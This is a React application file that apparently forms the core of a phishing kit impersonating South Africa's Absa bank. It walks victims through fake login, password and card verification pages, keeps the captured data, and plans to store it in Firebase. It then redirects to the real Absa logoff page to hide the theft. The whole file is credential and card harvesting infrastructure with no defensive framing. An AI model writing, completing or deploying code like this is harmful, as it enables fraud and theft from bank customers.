import React, { useState } from 'react';
import LoginPage from './pages/LoginPage';
import PasswordPage from './pages/PasswordPage';
import CardVerificationPage from './pages/CardVerificationPage';

function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [loginData, setLoginData] = useState(null);

  const handleStep1Submit = (data) => {
    console.log('Step 1 completed:', data);
    setLoginData(data);
    // TODO: Save to Firebase here (Step 1 data)
    setCurrentStep(2);
  };

  const handleStep2Submit = (data) => {
    console.log('Step 2 completed:', data);
    setLoginData(data);
    // TODO: Save to Firebase here (Step 1 + Step 2 data)
    setCurrentStep(3);
  };

  const handleStep3Submit = async (data) => {
    console.log('Step 3 completed - FINAL DATA:', data);
    setLoginData(data);
    
    // TODO: Save FINAL data to Firebase here (All 3 steps)
    // Example Firebase code:
    /*
    try {
      await saveToFirebase('users', data);
      console.log('Data saved successfully to Firebase');
    } catch (error) {
      console.error('Firebase error:', error);
      alert('Error saving data');
      return;
    }
    */
    
    // Simulate saving delay (remove this when Firebase is added)
    console.log('Saving to Firebase...');
    
    // Wait a moment to show the data was saved
    setTimeout(() => {
      console.log('Redirecting to Absa website...');
      // Redirect to Absa website
      window.location.href = 'https://www.absa.co.za/absa-online-logoff/';
    }, 1000);
  };

  return (
    <div className="App">
      {currentStep === 1 && (
        <LoginPage onLoginSubmit={handleStep1Submit} />
      )}
      {currentStep === 2 && (
        <PasswordPage 
          loginData={loginData} 
          onPasswordSubmit={handleStep2Submit} 
        />
      )}
      {currentStep === 3 && (
        <CardVerificationPage 
          loginData={loginData} 
          onCardVerificationSubmit={handleStep3Submit} 
        />
      )}
    </div>
  );
}

export default App;